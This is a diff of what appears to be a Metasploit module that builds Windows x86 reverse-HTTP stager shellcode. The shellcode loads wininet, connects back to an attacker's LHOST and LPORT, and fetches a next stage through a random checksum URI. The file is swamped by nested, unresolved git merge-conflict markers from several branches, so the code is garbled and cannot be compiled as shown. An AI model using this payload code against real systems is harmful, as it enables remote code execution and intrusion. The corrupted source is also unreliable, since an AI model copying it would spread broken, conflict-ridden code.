@@ -12,6 +12,7 @@ require 'msf/core'
 <<<<<<< HEAD
 <<<<<<< HEAD
 <<<<<<< HEAD
+<<<<<<< HEAD
 =======
 >>>>>>> 4.11.2_release_pre-rails4
 =======
@@ -66,12 +67,15 @@ module Msf
 <<<<<<< HEAD
 <<<<<<< HEAD
 >>>>>>> pod/metasploit-gemfile-
+=======
+>>>>>>> feature/complex-payloads
 require 'msf/core/payload/windows/block_api'
 require 'msf/core/payload/windows/exitfunk'
 
 module Msf
 
 
+<<<<<<< HEAD
 <<<<<<< HEAD
 <<<<<<< HEAD
 =======
@@ -185,12 +189,15 @@ module Msf
 >>>>>>> chore/MSP-12110/celluloid-supervision-tree
 =======
 >>>>>>> chore/MSP-12110/celluloid-supervision-tree
+=======
+>>>>>>> feature/complex-payloads
 ###
 #
 # Complex payload generation for Windows ARCH_X86 that speak HTTP(S)
 #
 ###
 
+<<<<<<< HEAD
 <<<<<<< HEAD
 <<<<<<< HEAD
 <<<<<<< HEAD
@@ -295,11 +302,14 @@ module Payload::Windows::ReverseHttp
 =======
 =======
 >>>>>>> pod/complex-payloads
+=======
+>>>>>>> feature/complex-payloads
 
 module Payload::Windows::ReverseHttp
 
   include Msf::Payload::Windows::BlockApi
   include Msf::Payload::Windows::Exitfunk
+<<<<<<< HEAD
 <<<<<<< HEAD
 >>>>>>> feature/complex-payloads
 =======
@@ -371,12 +381,15 @@ module Payload::Windows::ReverseHttp
 >>>>>>> chore/MSP-12110/celluloid-supervision-tree
 =======
 >>>>>>> chore/MSP-12110/celluloid-supervision-tree
+=======
+>>>>>>> feature/complex-payloads
 
   #
   # Register reverse_http specific options
   #
   def initialize(*args)
     super
+<<<<<<< HEAD
 <<<<<<< HEAD
 <<<<<<< HEAD
 <<<<<<< HEAD
@@ -552,12 +565,18 @@ module Payload::Windows::ReverseHttp
 >>>>>>> chore/MSP-12110/celluloid-supervision-tree
 =======
 >>>>>>> chore/MSP-12110/celluloid-supervision-tree
+=======
+    register_advanced_options(
+      [
+        OptInt.new('HTTPStagerURILength', [false, 'The URI length for the stager (5 to 240ish bytes)'])
+>>>>>>> feature/complex-payloads
       ], self.class)
   end
 
   #
   # Generate the first stage
   #
+<<<<<<< HEAD
 <<<<<<< HEAD
 <<<<<<< HEAD
 <<<<<<< HEAD
@@ -624,6 +643,8 @@ module Payload::Windows::ReverseHttp
 >>>>>>> pod/complex-payloads
 =======
 >>>>>>> pod/metasploit-gemfile-
+=======
+>>>>>>> feature/complex-payloads
   def generate
     # Generate the simple version of this stager if we don't have enough space
     if self.available_space.nil? || required_space > self.available_space
@@ -642,6 +663,7 @@ module Payload::Windows::ReverseHttp
       exitfunk: datastore['EXITFUNC']
     }
 
+<<<<<<< HEAD
 <<<<<<< HEAD
 <<<<<<< HEAD
 <<<<<<< HEAD
@@ -803,6 +825,8 @@ module Payload::Windows::ReverseHttp
 >>>>>>> chore/MSP-12110/celluloid-supervision-tree
 =======
 >>>>>>> chore/MSP-12110/celluloid-supervision-tree
+=======
+>>>>>>> feature/complex-payloads
     generate_reverse_http(conf)
   end
 
@@ -821,6 +845,7 @@ module Payload::Windows::ReverseHttp
     Metasm::Shellcode.assemble(Metasm::X86.new, combined_asm).encode_string
   end
 
+<<<<<<< HEAD
 <<<<<<< HEAD
 <<<<<<< HEAD
 <<<<<<< HEAD
@@ -998,12 +1023,18 @@ module Payload::Windows::ReverseHttp
 >>>>>>> chore/MSP-12110/celluloid-supervision-tree
 =======
 >>>>>>> chore/MSP-12110/celluloid-supervision-tree
+=======
+  # TODO: Use the CachedSize instead (PR #4894)
+  def cached_size
+    321
+>>>>>>> feature/complex-payloads
   end
 
   #
   # Generate the URI for the initial stager
   #
   def generate_uri
+<<<<<<< HEAD
 <<<<<<< HEAD
 <<<<<<< HEAD
 <<<<<<< HEAD
@@ -1139,6 +1170,8 @@ module Payload::Windows::ReverseHttp
 <<<<<<< HEAD
 <<<<<<< HEAD
 =======
+=======
+>>>>>>> feature/complex-payloads
     # Maximum URL is limited to https:// plus 256 bytes, figure out our maximum URI
     uri_max_len = 256 - "#{datastore['LHOST']}:#{datastore['LPORT']}/".length
 
@@ -1158,6 +1191,7 @@ module Payload::Windows::ReverseHttp
 
     # Generate a random 30+ byte URI
     "/" + generate_uri_checksum(Msf::Handler::ReverseHttp::URI_CHECKSUM_INITW, 30 + rand(uri_max_len-30))
+<<<<<<< HEAD
 >>>>>>> feature/complex-payloads
 =======
 <<<<<<< HEAD
@@ -1227,6 +1261,8 @@ module Payload::Windows::ReverseHttp
 >>>>>>> chore/MSP-12110/celluloid-supervision-tree
 =======
 >>>>>>> chore/MSP-12110/celluloid-supervision-tree
+=======
+>>>>>>> feature/complex-payloads
   end
 
   #
@@ -1249,6 +1285,7 @@ module Payload::Windows::ReverseHttp
 <<<<<<< HEAD
 <<<<<<< HEAD
 <<<<<<< HEAD
+<<<<<<< HEAD
     # Make room for the maximum possible URL length
     space += 256
 =======
@@ -1361,6 +1398,10 @@ module Payload::Windows::ReverseHttp
     # Make room for the maximum possible URL length
     space += 256
 >>>>>>> chore/MSP-12110/celluloid-supervision-tree
+=======
+    # Add 251 bytes for large URI support (technically a little less, but lets go with it)
+    space += 251
+>>>>>>> feature/complex-payloads
 
     # EXITFUNK processing adds 31 bytes at most (for ExitThread, only ~16 for others)
     space += 31
@@ -1375,6 +1416,7 @@ module Payload::Windows::ReverseHttp
 <<<<<<< HEAD
 <<<<<<< HEAD
 <<<<<<< HEAD
+<<<<<<< HEAD
     # Proxy options?
     space += 200
 
@@ -1499,6 +1541,8 @@ module Payload::Windows::ReverseHttp
     space += 200
 
 >>>>>>> chore/MSP-12110/celluloid-supervision-tree
+=======
+>>>>>>> feature/complex-payloads
     # The final estimated size
     space
   end
@@ -1514,6 +1558,7 @@ module Payload::Windows::ReverseHttp
 <<<<<<< HEAD
 <<<<<<< HEAD
 <<<<<<< HEAD
+<<<<<<< HEAD
 =======
 <<<<<<< HEAD
 =======
@@ -1538,6 +1583,8 @@ module Payload::Windows::ReverseHttp
 <<<<<<< HEAD
 <<<<<<< HEAD
 >>>>>>> pod/metasploit-gemfile-
+=======
+>>>>>>> feature/complex-payloads
   # Dynamic payload generation
   #
   def asm_reverse_http(opts={})
@@ -1570,6 +1617,7 @@ module Payload::Windows::ReverseHttp
       #;0x00200000 | ; INTERNET_FLAG_NO_AUTO_REDIRECT
       #;0x00000200   ; INTERNET_FLAG_NO_UI
       http_open_flags = ( 0x80000000 | 0x04000000 | 0x00400000 | 0x00200000 | 0x00000200 )
+<<<<<<< HEAD
 <<<<<<< HEAD
 <<<<<<< HEAD
 =======
@@ -1851,10 +1899,13 @@ module Payload::Windows::ReverseHttp
 >>>>>>> chore/MSP-12110/celluloid-supervision-tree
 =======
 >>>>>>> chore/MSP-12110/celluloid-supervision-tree
+=======
+>>>>>>> feature/complex-payloads
     end
 
     asm = %Q^
       ;-----------------------------------------------------------------------------;
+<<<<<<< HEAD
 <<<<<<< HEAD
 <<<<<<< HEAD
 <<<<<<< HEAD
@@ -1877,6 +1928,8 @@ module Payload::Windows::ReverseHttp
 <<<<<<< HEAD
 <<<<<<< HEAD
 =======
+=======
+>>>>>>> feature/complex-payloads
       ; Author: HD Moore
       ; Compatible: Confirmed Windows 7, Windows 2008 Server, Windows XP SP1, Windows SP3, Windows 2000
       ; Known Bugs: Incompatible with Windows NT 4.0, buggy on Windows XP Embedded (SP1)
@@ -1885,6 +1938,7 @@ module Payload::Windows::ReverseHttp
 
       ; Input: EBP must be the address of 'api_call'.
       ; Output: EDI will be the socket for the connection to the server
+<<<<<<< HEAD
 >>>>>>> feature/complex-payloads
 =======
 <<<<<<< HEAD
@@ -2035,6 +2089,8 @@ module Payload::Windows::ReverseHttp
 >>>>>>> chore/MSP-12110/celluloid-supervision-tree
 =======
 >>>>>>> chore/MSP-12110/celluloid-supervision-tree
+=======
+>>>>>>> feature/complex-payloads
       ; Clobbers: EAX, ESI, EDI, ESP will also be modified (-0x1A0)
       load_wininet:
         push 0x0074656e        ; Push the bytes 'wininet',0 onto the stack.
@@ -2042,6 +2098,7 @@ module Payload::Windows::ReverseHttp
         push esp               ; Push a pointer to the "wininet" string on the stack.
         push 0x0726774C        ; hash( "kernel32.dll", "LoadLibraryA" )
         call ebp               ; LoadLibraryA( "wininet" )
+<<<<<<< HEAD
 <<<<<<< HEAD
 <<<<<<< HEAD
 <<<<<<< HEAD
@@ -2071,6 +2128,8 @@ module Payload::Windows::ReverseHttp
 <<<<<<< HEAD
 <<<<<<< HEAD
 <<<<<<< HEAD
+=======
+>>>>>>> feature/complex-payloads
 
       set_retry:
         push.i8 8              ; retry 8 times should be enough
@@ -2094,6 +2153,7 @@ module Payload::Windows::ReverseHttp
                                ; DWORD_PTR dwContext (NULL) [6]
                                ; dwFlags [7]
         push.i8 3              ; DWORD dwService (INTERNET_SERVICE_HTTP)
+<<<<<<< HEAD
 =======
 =======
 >>>>>>> rapid7/master
@@ -2282,10 +2342,13 @@ module Payload::Windows::ReverseHttp
 >>>>>>> chore/MSP-12110/celluloid-supervision-tree
 =======
 >>>>>>> chore/MSP-12110/celluloid-supervision-tree
+=======
+>>>>>>> feature/complex-payloads
         push ebx               ; password (NULL)
         push ebx               ; username (NULL)
         push #{opts[:port]}    ; PORT
         call got_server_uri    ; double call to get pointer for both server_uri and
+<<<<<<< HEAD
 <<<<<<< HEAD
 <<<<<<< HEAD
 <<<<<<< HEAD
@@ -2320,6 +2383,8 @@ module Payload::Windows::ReverseHttp
 <<<<<<< HEAD
 <<<<<<< HEAD
 >>>>>>> pod/metasploit-gemfile-
+=======
+>>>>>>> feature/complex-payloads
       server_uri:              ;  server_host; server_uri is saved in EDI for later
         db "#{opts[:url]}", 0x00
       got_server_host:
@@ -2329,6 +2394,7 @@ module Payload::Windows::ReverseHttp
 
       httpopenrequest:
                                ; dwContext (NULL) [8]
+<<<<<<< HEAD
 <<<<<<< HEAD
 <<<<<<< HEAD
 =======
@@ -2516,12 +2582,15 @@ module Payload::Windows::ReverseHttp
 >>>>>>> chore/MSP-12110/celluloid-supervision-tree
 =======
 >>>>>>> chore/MSP-12110/celluloid-supervision-tree
+=======
+>>>>>>> feature/complex-payloads
         push #{"0x%.8x" % http_open_flags}   ; dwFlags
         push ebx               ; accept types
         push ebx               ; referrer
         push ebx               ; version
         push edi               ; server URI
         push ebx               ; method
+<<<<<<< HEAD
 <<<<<<< HEAD
 <<<<<<< HEAD
 <<<<<<< HEAD
@@ -2623,10 +2692,14 @@ module Payload::Windows::ReverseHttp
 =======
         push esi               ; hConnection
 >>>>>>> chore/MSP-12110/celluloid-supervision-tree
+=======
+        push eax               ; hConnection
+>>>>>>> feature/complex-payloads
         push 0x3B2E55EB        ; hash( "wininet.dll", "HttpOpenRequestA" )
         call ebp
         xchg esi, eax          ; save hHttpRequest in esi
 
+<<<<<<< HEAD
 <<<<<<< HEAD
 <<<<<<< HEAD
 <<<<<<< HEAD
@@ -2703,6 +2776,8 @@ module Payload::Windows::ReverseHttp
 <<<<<<< HEAD
 <<<<<<< HEAD
 >>>>>>> pod/metasploit-gemfile-
+=======
+>>>>>>> feature/complex-payloads
       send_request:
       ^
 
@@ -2724,6 +2799,7 @@ module Payload::Windows::ReverseHttp
           push 0x869E4675        ; hash( "wininet.dll", "InternetSetOptionA" )
           call ebp
         ^
+<<<<<<< HEAD
 <<<<<<< HEAD
 <<<<<<< HEAD
 <<<<<<< HEAD
@@ -2894,6 +2970,8 @@ module Payload::Windows::ReverseHttp
 >>>>>>> chore/MSP-12110/celluloid-supervision-tree
 =======
 >>>>>>> chore/MSP-12110/celluloid-supervision-tree
+=======
+>>>>>>> feature/complex-payloads
     end
 
     asm << %Q^
@@ -2913,6 +2991,7 @@ module Payload::Windows::ReverseHttp
         jnz send_request
 
       ; if we didn't allocate before running out of retries, bail out
+<<<<<<< HEAD
 <<<<<<< HEAD
 <<<<<<< HEAD
 <<<<<<< HEAD
@@ -3027,6 +3106,8 @@ module Payload::Windows::ReverseHttp
 <<<<<<< HEAD
 <<<<<<< HEAD
 >>>>>>> pod/metasploit-gemfile-
+=======
+>>>>>>> feature/complex-payloads
       ^
 
       if opts[:exitfunk]
@@ -3091,6 +3172,7 @@ module Payload::Windows::ReverseHttp
       end
 <<<<<<< HEAD
 <<<<<<< HEAD
+<<<<<<< HEAD
 =======
 >>>>>>> pod/metasploit-gemfile-
 =======
@@ -3334,6 +3416,8 @@ module Payload::Windows::ReverseHttp
 >>>>>>> chore/MSP-12110/celluloid-supervision-tree
 =======
 >>>>>>> chore/MSP-12110/celluloid-supervision-tree
+=======
+>>>>>>> feature/complex-payloads
     asm
   end
 
@@ -3351,6 +3435,7 @@ module Payload::Windows::ReverseHttp
     20
   end
 
+<<<<<<< HEAD
 <<<<<<< HEAD
 <<<<<<< HEAD
 <<<<<<< HEAD
@@ -3436,6 +3521,9 @@ module Payload::Windows::ReverseHttp
 >>>>>>> chore/MSP-12110/celluloid-supervision-tree
 =======
 >>>>>>> chore/MSP-12110/celluloid-supervision-tree
+=======
+
+>>>>>>> feature/complex-payloads
 end
 
 end
